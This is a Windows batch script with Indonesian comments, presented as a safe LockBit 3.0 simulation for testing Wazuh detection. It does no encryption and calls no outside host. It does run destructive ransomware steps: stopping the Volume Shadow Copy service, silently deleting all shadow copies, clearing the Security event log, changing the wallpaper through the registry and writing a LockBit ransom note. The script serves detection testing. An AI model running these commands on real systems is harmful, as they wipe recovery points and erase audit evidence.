@echo off
REM =================================================================
REM SKRIP SIMULASI LOCKBIT 3.0 (VERSI AMAN BERDASARKAN BUILDER ASLI)
REM TUJUAN: HANYA UNTUK PENGUJIAN DETEKSI WAZUH
REM =================================================================

echo [INFO] Memulai simulasi serangan LockBit 3.0...
echo.

REM --- TTP 1: Menghentikan Layanan Volume Shadow Copy (VSS) ---
echo [TAHAP 1] Menghentikan layanan penting (VSS)...
net stop VSS
echo.

REM --- TTP 2: Menghapus Shadow Copies ---
echo [TAHAP 2] Menghapus shadow copies untuk mencegah pemulihan...
vssadmin.exe delete shadows /all /quiet
echo.

REM --- TTP 3: Membersihkan Log Keamanan (Security Log) ---
echo [TAHAP 3] Menghapus jejak dengan membersihkan event log...
wevtutil.exe cl Security
echo.

REM --- TTP 4: Mengubah Wallpaper Desktop ---
echo [TAHAP 4] Mengubah wallpaper desktop...
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\WINDOWS\System32\lockbit_wallpaper.bmp" /f
REM (Catatan: Anda perlu membuat file gambar dummy bernama lockbit_wallpaper.bmp di C:\WINDOWS\System32\)
echo.

REM --- TTP 5: Membuat Catatan Tebusan (Ransom Note) ---
echo [TAHAP 5] Membuat catatan tebusan...
echo. > "C:\Users\[REDACTED]\OneDrive\Desktop\B7568014A48684D6.README.txt"
echo            ~~~ LockBit 3.0 the world's fastest ransomware since 2019~~~ >> "C:\Users\[REDACTED]\OneDrive\Desktop\B7568014A48684D6.README.txt"
echo. >> "C:\Users\[REDACTED]\OneDrive\Desktop\B7568014A48684D6.README.txt"
echo Your personal DECRYPTION ID: B7568014A48684D6D525F3F3722638C4 >> "C:\Users\[REDACTED]\OneDrive\Desktop\B7568014A48684D6.README.txt"
echo.

echo [SELESAI] Simulasi serangan LockBit 3.0 telah selesai dijalankan.
pause